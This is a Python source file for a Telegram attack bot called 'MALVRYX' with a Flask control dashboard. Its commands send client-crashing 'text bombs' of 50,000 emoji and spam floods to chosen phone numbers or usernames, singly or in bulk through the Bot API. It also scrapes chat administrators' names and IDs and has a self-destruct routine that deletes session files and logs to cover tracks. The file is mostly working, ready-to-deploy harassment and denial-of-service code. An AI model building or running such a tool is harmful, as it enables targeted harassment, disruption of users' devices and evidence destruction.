#!/usr/bin/env python3
import os, sys, time, asyncio, json, threading, sqlite3
from pyrogram import Client, filters
from flask import Flask, render_template_string, request, jsonify
from datetime import datetime
import requests
from flask_cors import CORS

# ========== FIX: Python 3.14 event loop ==========
import asyncio
try:
    # Python 3.14 needs this
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
except:
    pass

# ========== RENDER ENVIRONMENT VARIABLES ==========
API_ID = int(os.environ.get("API_ID", 0))
API_HASH = os.environ.get("API_HASH", "")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
LOG_CHANNEL = os.environ.get("LOG_CHANNEL", "")
ADMIN_USER_IDS = [int(x) for x in os.environ.get("ADMIN_USER_IDS", "0").split(",")]
PORT = int(os.environ.get("PORT", 5000))

# ========== GLOBAL STATE ==========
targets = {}
scraped_data = {}
logs = []
BOT_MODE = "private"
ATTACK_DELAY = 0.5
ADMIN_IDS = []

flask_app = Flask(__name__)
CORS(flask_app)

# ========== TELEGRAM BOT ==========
app = Client("session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ========== MENU ==========
@app.on_message(filters.command(["start", "help", "menu"]))
async def menu_command(client, message):
    menu_text = """
🤖 **MALVRYX COMMANDS**

**🔥 ATTACKS:**
`.crash <target>` - Text bomb
`.flood <target>` - Spam messages

**👑 ADMIN:**
`.snatch <chat_id>` - Snatch admins

**⚙️ SETTINGS:**
`.delay <seconds>` - Set delay
`.mode <public/private>` - Set mode
`.status` - Show status
`.destroy` - Self-destruct
"""
    await message.reply_text(menu_text)

@app.on_message(filters.command(["crash", "flood"]))
async def attack_commands(client, message):
    if BOT_MODE == "private" and message.chat.type != "private":
        await message.reply_text("❌ Bot is in private mode. Use in DM only.")
        return
    
    cmd = message.command[0]
    target = message.command[1] if len(message.command) > 1 else str(message.chat.id)
    
    await message.reply_text(f"⚡ Executing {cmd} on {target}...")
    
    if cmd == "crash":
        for _ in range(30):
            try:
                await app.send_message(target, "🟥" * 50000)
                await asyncio.sleep(ATTACK_DELAY)
            except: pass
    elif cmd == "flood":
        for i in range(50):
            try:
                await app.send_message(target, f"🌊 FLOOD {i}")
                await asyncio.sleep(ATTACK_DELAY)
            except: pass

@app.on_message(filters.command(["delay", "mode", "status", "destroy"]))
async def settings_commands(client, message):
    global BOT_MODE, ATTACK_DELAY
    cmd = message.command[0]
    
    if cmd == "delay":
        if len(message.command) > 1:
            try:
                ATTACK_DELAY = float(message.command[1])
                await message.reply_text(f"⏱️ Delay set to {ATTACK_DELAY}s")
            except:
                await message.reply_text("❌ Invalid delay.")
        else:
            await message.reply_text(f"⏱️ Current delay: {ATTACK_DELAY}s")
    
    elif cmd == "mode":
        if len(message.command) > 1:
            new_mode = message.command[1].lower()
            if new_mode in ["public", "private"]:
                BOT_MODE = new_mode
                await message.reply_text(f"✅ Mode set to: {BOT_MODE}")
            else:
                await message.reply_text("❌ Invalid mode.")
        else:
            await message.reply_text(f"📌 Current mode: {BOT_MODE}")
    
    elif cmd == "status":
        await message.reply_text(f"""
📊 **STATUS**
Mode: {BOT_MODE}
Delay: {ATTACK_DELAY}s
Targets: {len(targets)}
        """)
    
    elif cmd == "destroy":
        await message.reply_text("💀 SELF-DESTRUCT INITIATED...")
        await asyncio.sleep(2)
        os.system("rm -rf session* *.log")
        sys.exit(0)

@app.on_message(filters.command(["snatch"]))
async def snatch_command(client, message):
    chat_id = message.command[1] if len(message.command) > 1 else message.chat.id
    try:
        admins = await client.get_chat_members(chat_id, filter="administrators")
        admin_list = []
        for admin in admins:
            admin_list.append(f"• {admin.user.first_name} (@{admin.user.username or 'No username'})")
            ADMIN_IDS.append(admin.user.id)
        await message.reply_text(f"👑 Snatched {len(admin_list)} admins\n\n" + "\n".join(admin_list[:10]))
    except Exception as e:
        await message.reply_text(f"❌ Failed: {e}")

# ========== DASHBOARD ==========
DASHBOARD = """
<!DOCTYPE html>
<html>
<head>
    <title>MALVRYX</title>
    <style>
        body { background: #0a0e17; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #00ff41; padding-bottom: 20px; }
        .logo { font-size: 32px; font-weight: bold; color: #00ff41; }
        .live { color: #ff0044; animation: pulse 1s infinite; }
        @keyframes pulse { 50% { opacity: 0; } }
        .stats { display: grid; grid-template-columns: repeat(5, 1fr); gap: 15px; margin: 20px 0; }
        .stat-card { background: rgba(0,255,65,0.05); border: 1px solid rgba(0,255,65,0.2); padding: 15px; border-radius: 10px; text-align: center; }
        .stat-value { font-size: 24px; font-weight: bold; }
        .stat-label { font-size: 11px; color: rgba(255,255,255,0.4); }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }
        .card { background: rgba(255,255,255,0.02); border: 1px solid rgba(0,255,65,0.1); padding: 20px; border-radius: 10px; }
        input { background: rgba(255,255,255,0.05); border: 1px solid rgba(0,255,65,0.2); padding: 10px; color: #fff; border-radius: 5px; width: 70%; }
        .btn { background: rgba(0,255,65,0.1); border: 1px solid #00ff41; padding: 10px 20px; color: #00ff41; cursor: pointer; border-radius: 5px; }
        .btn:hover { background: #00ff41; color: #000; }
        .btn-danger { border-color: #ff0044; color: #ff0044; }
        .btn-danger:hover { background: #ff0044; color: #000; }
        .log-box { background: rgba(0,0,0,0.5); padding: 15px; border-radius: 10px; max-height: 200px; overflow-y: auto; font-size: 12px; color: rgba(255,255,255,0.6); }
        .pre-box { background: rgba(0,0,0,0.4); padding: 10px; border-radius: 5px; max-height: 150px; overflow-y: auto; font-size: 11px; color: rgba(255,255,255,0.5); margin-top: 10px; }
        @media (max-width: 768px) { .stats { grid-template-columns: repeat(3, 1fr); } .grid { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div><span class="logo">⚡ MALVRYX</span></div>
            <div><span class="live">● LIVE</span> | Mode: {{ mode }} | Delay: {{ delay }}s</div>
        </div>
        
        <div class="stats">
            <div class="stat-card"><div class="stat-value">{{ admins }}</div><div class="stat-label">Admins</div></div>
            <div class="stat-card"><div class="stat-value">{{ targets }}</div><div class="stat-label">Targets</div></div>
            <div class="stat-card"><div class="stat-value">{{ attacks }}</div><div class="stat-label">Attacks</div></div>
            <div class="stat-card"><div class="stat-value">{{ saved }}</div><div class="stat-label">Saved</div></div>
            <div class="stat-card"><div class="stat-value">{{ errors }}</div><div class="stat-label">Errors</div></div>
        </div>
        
        <div class="grid">
            <div class="card">
                <h3>🎯 Targets</h3>
                <input id="target_input" placeholder="+123456789 or @username" />
                <button class="btn" onclick="addTarget()">Add</button>
                <div class="pre-box" id="target_list">{{ target_list }}</div>
            </div>
            <div class="card">
                <h3>👑 Admin Snatch</h3>
                <input id="chat_id" placeholder="Chat ID" />
                <button class="btn" onclick="snatchAdmins()">Snatch</button>
                <div class="pre-box" id="admin_result">Ready...</div>
            </div>
        </div>
        
        <div class="card">
            <h3>💀 Attacks</h3>
            <button class="btn" onclick="sendCommand('mass_crash')">🔥 Crash</button>
            <button class="btn" onclick="sendCommand('mass_flood')">🌊 Flood</button>
            <button class="btn" onclick="sendCommand('delay_0.1')">0.1s</button>
            <button class="btn" onclick="sendCommand('delay_1')">1s</button>
            <button class="btn" onclick="sendCommand('mode_public')">Public</button>
            <button class="btn" onclick="sendCommand('mode_private')">Private</button>
            <button class="btn btn-danger" onclick="sendCommand('self_destruct')">💀 Destroy</button>
        </div>
        
        <div class="card" style="margin-top:20px;">
            <h3>📜 Logs</h3>
            <div class="log-box">
                {% for log in logs %}
                <div>{{ log }}</div>
                {% endfor %}
            </div>
        </div>
    </div>
    
    <script>
        setInterval(() => location.reload(), 5000);
        
        function addTarget() {
            let t = document.getElementById('target_input').value;
            fetch('/add_target', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: t}) })
            .then(() => location.reload());
        }
        function snatchAdmins() {
            let chat = document.getElementById('chat_id').value;
            fetch('/snatch', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chat}) })
            .then(r => r.json()).then(d => document.getElementById('admin_result').innerText = JSON.stringify(d, null, 2));
        }
        function sendCommand(cmd) {
            fetch('/command', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cmd: cmd}) })
            .then(() => location.reload());
        }
    </script>
</body>
</html>
"""

# ========== FLASK ROUTES ==========
@flask_app.route('/')
def index():
    return render_template_string(DASHBOARD,
        mode=BOT_MODE,
        delay=ATTACK_DELAY,
        admins=len(ADMIN_IDS),
        targets=len(targets),
        attacks=0,
        saved=0,
        errors=0,
        target_list=json.dumps(targets, indent=2)[:300],
        logs=logs[-15:]
    )

@flask_app.route('/add_target', methods=['POST'])
def add_target():
    t = request.json.get('target')
    if t:
        targets[t] = {"added": time.time()}
        log(f"✅ Added target: {t}")
    return jsonify({"ok": True})

@flask_app.route('/snatch', methods=['POST'])
def snatch_route():
    chat_id = request.json.get('chat_id')
    return jsonify({"status": "snatch requested", "chat_id": chat_id})

@flask_app.route('/command', methods=['POST'])
def command_route():
    global BOT_MODE, ATTACK_DELAY
    cmd = request.json.get('cmd')
    log(f"⚡ Command: {cmd}")
    
    if cmd == "mass_crash":
        threading.Thread(target=mass_crash).start()
    elif cmd == "mass_flood":
        threading.Thread(target=mass_flood).start()
    elif cmd.startswith("delay_"):
        ATTACK_DELAY = float(cmd.split("_")[1])
    elif cmd == "mode_public":
        BOT_MODE = "public"
    elif cmd == "mode_private":
        BOT_MODE = "private"
    elif cmd == "self_destruct":
        threading.Thread(target=self_destruct).start()
    return jsonify({"ok": True})

def mass_crash():
    for target in targets:
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                         json={"chat_id": target, "text": "💥CRASH " * 1000})
            time.sleep(ATTACK_DELAY)
        except: pass
    log("💥 Mass crash executed")

def mass_flood():
    for target in targets:
        for i in range(30):
            try:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                             json={"chat_id": target, "text": f"🌊 FLOOD {i}"})
                time.sleep(ATTACK_DELAY)
            except: pass
    log("🌊 Mass flood executed")

def self_destruct():
    os.system("rm -rf session* *.log")
    log("💀 Self-destructed")
    sys.exit(0)

def log(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    logs.append(f"[{timestamp}] {msg}")
    if len(logs) > 100:
        logs.pop(0)
    print(f"[{timestamp}] {msg}")

# ========== FIX: Proper startup for Python 3.14 ==========
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(app.start())
        loop.run_forever()
    except KeyboardInterrupt:
        pass

def run_flask():
    flask_app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    log("🚀 MALVRYX STARTING...")
    
    # Start Flask
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()
    
    # Run bot with Python 3.14 fix
    run_bot()
